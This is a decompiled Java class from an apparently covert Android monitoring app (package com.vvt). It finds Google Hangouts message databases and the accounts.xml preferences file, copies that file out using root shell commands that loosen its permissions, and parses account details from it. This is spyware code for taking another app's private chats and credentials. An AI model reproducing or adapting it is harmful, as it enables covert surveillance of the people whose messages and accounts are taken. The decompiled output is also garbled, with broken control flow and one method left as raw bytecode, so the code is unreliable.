package com.vvt.n.a.b;

import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import java.util.Locale;

public class b
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.d;
  private static final boolean c = com.vvt.ak.a.e;
  
  public static String a(String paramString)
  {
    String[] arrayOfString = a();
    int i = arrayOfString.length;
    int j = 0;
    String str = null;
    int k = 0;
    if (k < i)
    {
      str = a(arrayOfString[k], paramString);
      boolean bool = com.vvt.ag.b.a(str);
      if (bool) {}
    }
    for (;;)
    {
      return str;
      j = k + 1;
      k = j;
      break;
      j = 0;
      str = null;
    }
  }
  
  private static String a(String paramString1, String paramString2)
  {
    int i = 1;
    boolean bool1 = false;
    Object localObject = b(paramString2);
    int j = com.vvt.ag.b.a((String)localObject);
    int k;
    String str;
    Object[] arrayOfObject;
    if (j != 0)
    {
      boolean bool3 = b;
      if (bool3) {}
      k = 20;
      j = k;
      if (j < 0) {
        break label211;
      }
      localObject = Locale.US;
      str = "babel%d.db";
      arrayOfObject = new Object[i];
      Integer localInteger = Integer.valueOf(j);
      arrayOfObject[0] = localInteger;
      localObject = String.format((Locale)localObject, str, arrayOfObject);
      localObject = p.a(paramString1, (String)localObject);
      boolean bool4 = a;
      if (bool4) {}
      bool4 = ShellUtil.b((String)localObject);
      if (bool4)
      {
        bool1 = a;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      return (String)localObject;
      k = j + -1;
      j = k;
      break;
      Locale localLocale = Locale.US;
      str = "babel%s.db";
      arrayOfObject = new Object[i];
      arrayOfObject[0] = localObject;
      localObject = String.format(localLocale, str, arrayOfObject);
      localObject = p.a(paramString1, (String)localObject);
      boolean bool2 = a;
      if (bool2) {}
      bool2 = ShellUtil.b((String)localObject);
      if (bool2)
      {
        bool1 = a;
        if (!bool1) {}
      }
      else
      {
        label211:
        k = 0;
        localObject = null;
      }
    }
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    String str1 = p.a(paramString1, "hangouts");
    String str2 = p.a(str1, "accounts.xml");
    try
    {
      boolean bool1 = ShellUtil.b(str1);
      if (!bool1)
      {
        bool1 = a;
        if (bool1) {}
        localObject = "mkdir %s; chmod 777 %s; chown %s.%s %s";
        j = 5;
        arrayOfObject = new Object[j];
        int k = 0;
        arrayOfObject[0] = str1;
        k = 1;
        arrayOfObject[k] = str1;
        k = 2;
        arrayOfObject[k] = paramString4;
        k = 3;
        arrayOfObject[k] = paramString4;
        k = 4;
        arrayOfObject[k] = str1;
        localObject = String.format((String)localObject, arrayOfObject);
        KMShell.a((String)localObject);
        bool1 = com.vvt.aa.a.c();
        if (bool1) {
          ShellUtil.k(str1);
        }
      }
      str1 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
      int i = 7;
      Object localObject = new Object[i];
      int j = 0;
      Object[] arrayOfObject = null;
      localObject[0] = paramString3;
      j = 1;
      localObject[j] = paramString2;
      j = 2;
      localObject[j] = str2;
      j = 3;
      localObject[j] = str2;
      j = 4;
      localObject[j] = paramString4;
      j = 5;
      localObject[j] = paramString4;
      j = 6;
      localObject[j] = str2;
      str1 = String.format(str1, (Object[])localObject);
      KMShell.a(str1);
      bool2 = com.vvt.aa.a.c();
      if (bool2) {
        ShellUtil.k(str2);
      }
      bool2 = a;
      if (!bool2) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = c;
        if (!bool2) {}
      }
    }
    return str2;
  }
  
  public static String[] a()
  {
    int i = 1;
    String[] arrayOfString = new String[i];
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[i] = "com.google.android.talk";
    arrayOfObject[2] = "databases";
    String str = String.format("%s/%s/%s", arrayOfObject);
    arrayOfString[0] = str;
    return arrayOfString;
  }
  
  public static String b()
  {
    int i = 4;
    int j = 3;
    int k = 2;
    int m = 1;
    int n = 0;
    String str1 = null;
    boolean bool1 = false;
    String[] arrayOfString = new String[k];
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[m] = "com.google.android.talk";
    arrayOfObject[k] = "shared_prefs";
    arrayOfObject[j] = "accounts.xml";
    String str2 = String.format("%s/%s/%s/%s", arrayOfObject);
    arrayOfString[0] = str2;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[m] = "com.google.android.talk";
    arrayOfObject[k] = "shared_prefs";
    String str3 = "accounts.xml";
    arrayOfObject[j] = str3;
    str2 = String.format("%s/%s/%s/%s", arrayOfObject);
    arrayOfString[m] = str2;
    int i1 = arrayOfString.length;
    int i2 = 0;
    str2 = null;
    if (i2 < i1)
    {
      str1 = arrayOfString[i2];
      boolean bool2 = ShellUtil.b(str1);
      if (bool2)
      {
        bool1 = a;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      return str1;
      n = i2 + 1;
      i2 = n;
      break;
      n = 0;
      str1 = null;
    }
  }
  
  /* Error */
  public static String b(String paramString)
  {
    // Byte code:
    //   0: ldc 37
    //   2: astore_1
    //   3: iconst_0
    //   4: istore_2
    //   5: aconst_null
    //   6: astore_3
    //   7: invokestatic 122	javax/xml/parsers/DocumentBuilderFactory:newInstance	()Ljavax/xml/parsers/DocumentBuilderFactory;
    //   10: astore 4
    //   12: new 124	java/io/File
    //   15: astore 5
    //   17: aload 5
    //   19: aload_0
    //   20: invokespecial 127	java/io/File:<init>	(Ljava/lang/String;)V
    //   23: aload 5
    //   25: invokevirtual 130	java/io/File:exists	()Z
    //   28: istore 6
    //   30: iload 6
    //   32: ifeq +315 -> 347
    //   35: new 132	java/io/FileInputStream
    //   38: astore 7
    //   40: aload 7
    //   42: aload 5
    //   44: invokespecial 135	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   47: aload 4
    //   49: invokevirtual 139	javax/xml/parsers/DocumentBuilderFactory:newDocumentBuilder	()Ljavax/xml/parsers/DocumentBuilder;
    //   52: astore_3
    //   53: new 141	org/xml/sax/InputSource
    //   56: astore 4
    //   58: aload 4
    //   60: aload 7
    //   62: invokespecial 144	org/xml/sax/InputSource:<init>	(Ljava/io/InputStream;)V
    //   65: aload_3
    //   66: aload 4
    //   68: invokevirtual 150	javax/xml/parsers/DocumentBuilder:parse	(Lorg/xml/sax/InputSource;)Lorg/w3c/dom/Document;
    //   71: astore_3
    //   72: aload_3
    //   73: invokeinterface 156 1 0
    //   78: astore 4
    //   80: aload 4
    //   82: invokeinterface 162 1 0
    //   87: ldc -92
    //   89: astore 4
    //   91: aload_3
    //   92: aload 4
    //   94: invokeinterface 168 2 0
    //   99: astore 4
    //   101: aload 4
    //   103: invokeinterface 174 1 0
    //   108: istore 8
    //   110: getstatic 13	com/vvt/n/a/removeFromPath/removeFromPath:a	Z
    //   113: istore_2
    //   114: iload_2
    //   115: ifeq +3 -> 118
    //   118: iconst_0
    //   119: istore_2
    //   120: aconst_null
    //   121: astore_3
    //   122: iload_2
    //   123: iload 8
    //   125: if_icmpge +105 -> 230
    //   128: aload 4
    //   130: iload_2
    //   131: invokeinterface 178 2 0
    //   136: astore 9
    //   138: aload 9
    //   140: invokeinterface 184 1 0
    //   145: astore 9
    //   147: ldc -70
    //   149: astore 10
    //   151: aload 9
    //   153: aload 10
    //   155: invokeinterface 192 2 0
    //   160: astore 10
    //   162: aload 10
    //   164: invokeinterface 196 1 0
    //   169: astore 10
    //   171: getstatic 13	com/vvt/n/a/removeFromPath/removeFromPath:a	Z
    //   174: istore 11
    //   176: iload 11
    //   178: ifeq +3 -> 181
    //   181: ldc -58
    //   183: astore 12
    //   185: aload 10
    //   187: aload 12
    //   189: invokevirtual 202	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   192: istore 11
    //   194: iload 11
    //   196: ifeq +51 -> 247
    //   199: ldc -52
    //   201: astore_3
    //   202: aload 9
    //   204: aload_3
    //   205: invokeinterface 192 2 0
    //   210: astore_3
    //   211: aload_3
    //   212: invokeinterface 196 1 0
    //   217: astore_3
    //   218: getstatic 13	com/vvt/n/a/removeFromPath/removeFromPath:a	Z
    //   221: istore 13
    //   223: iload 13
    //   225: ifeq +3 -> 228
    //   228: aload_3
    //   229: astore_1
    //   230: aload 7
    //   232: invokestatic 208	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   235: getstatic 13	com/vvt/n/a/removeFromPath/removeFromPath:a	Z
    //   238: istore 6
    //   240: iload 6
    //   242: ifeq +3 -> 245
    //   245: aload_1
    //   246: areturn
    //   247: ldc -46
    //   249: astore 12
    //   251: aload 10
    //   253: aload 12
    //   255: invokevirtual 202	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   258: istore 14
    //   260: iload 14
    //   262: ifeq +37 -> 299
    //   265: ldc -52
    //   267: astore_3
    //   268: aload 9
    //   270: aload_3
    //   271: invokeinterface 192 2 0
    //   276: astore_3
    //   277: aload_3
    //   278: invokeinterface 196 1 0
    //   283: astore_3
    //   284: getstatic 13	com/vvt/n/a/removeFromPath/removeFromPath:a	Z
    //   287: istore 13
    //   289: iload 13
    //   291: ifeq +3 -> 294
    //   294: aload_3
    //   295: astore_1
    //   296: goto -66 -> 230
    //   299: iload_2
    //   300: iconst_1
    //   301: iadd
    //   302: istore_2
    //   303: goto -181 -> 122
    //   306: astore 7
    //   308: iconst_0
    //   309: istore 6
    //   311: aconst_null
    //   312: astore 7
    //   314: getstatic 23	com/vvt/n/a/removeFromPath/removeFromPath:MyUncaughtExceptionHandler	Z
    //   317: istore_2
    //   318: iload_2
    //   319: ifeq -89 -> 230
    //   322: goto -92 -> 230
    //   325: astore_1
    //   326: iconst_0
    //   327: istore 6
    //   329: aconst_null
    //   330: astore 7
    //   332: aload 7
    //   334: invokestatic 208	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   337: aload_1
    //   338: athrow
    //   339: astore_1
    //   340: goto -8 -> 332
    //   343: astore_3
    //   344: goto -30 -> 314
    //   347: iconst_0
    //   348: istore 6
    //   350: aconst_null
    //   351: astore 7
    //   353: goto -123 -> 230
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	356	0	paramString	String
    //   2	294	1	localObject1	Object
    //   325	13	1	localObject2	Object
    //   339	1	1	localObject3	Object
    //   4	298	2	i	int
    //   302	1	2	j	int
    //   317	2	2	bool1	boolean
    //   6	289	3	localObject4	Object
    //   343	1	3	localException1	Exception
    //   10	119	4	localObject5	Object
    //   15	28	5	localFile	java.io.File
    //   28	321	6	bool2	boolean
    //   38	193	7	localFileInputStream	java.io.FileInputStream
    //   306	1	7	localException2	Exception
    //   312	40	7	localInputStream	java.io.InputStream
    //   108	18	8	k	int
    //   136	133	9	localObject6	Object
    //   149	103	10	localObject7	Object
    //   174	21	11	bool3	boolean
    //   183	71	12	str	String
    //   221	69	13	bool4	boolean
    //   258	3	14	bool5	boolean
    // Exception table:
    //   from	to	target	type
    //   12	15	306	java/lang/Exception
    //   19	23	306	java/lang/Exception
    //   23	28	306	java/lang/Exception
    //   35	38	306	java/lang/Exception
    //   42	47	306	java/lang/Exception
    //   12	15	325	finally
    //   19	23	325	finally
    //   23	28	325	finally
    //   35	38	325	finally
    //   42	47	325	finally
    //   47	52	339	finally
    //   53	56	339	finally
    //   60	65	339	finally
    //   66	71	339	finally
    //   72	78	339	finally
    //   80	87	339	finally
    //   92	99	339	finally
    //   101	108	339	finally
    //   110	113	339	finally
    //   130	136	339	finally
    //   138	145	339	finally
    //   153	160	339	finally
    //   162	169	339	finally
    //   171	174	339	finally
    //   187	192	339	finally
    //   204	210	339	finally
    //   211	217	339	finally
    //   218	221	339	finally
    //   253	258	339	finally
    //   270	276	339	finally
    //   277	283	339	finally
    //   284	287	339	finally
    //   314	317	339	finally
    //   47	52	343	java/lang/Exception
    //   53	56	343	java/lang/Exception
    //   60	65	343	java/lang/Exception
    //   66	71	343	java/lang/Exception
    //   72	78	343	java/lang/Exception
    //   80	87	343	java/lang/Exception
    //   92	99	343	java/lang/Exception
    //   101	108	343	java/lang/Exception
    //   110	113	343	java/lang/Exception
    //   130	136	343	java/lang/Exception
    //   138	145	343	java/lang/Exception
    //   153	160	343	java/lang/Exception
    //   162	169	343	java/lang/Exception
    //   171	174	343	java/lang/Exception
    //   187	192	343	java/lang/Exception
    //   204	210	343	java/lang/Exception
    //   211	217	343	java/lang/Exception
    //   218	221	343	java/lang/Exception
    //   253	258	343	java/lang/Exception
    //   270	276	343	java/lang/Exception
    //   277	283	343	java/lang/Exception
    //   284	287	343	java/lang/Exception
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/n/a/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */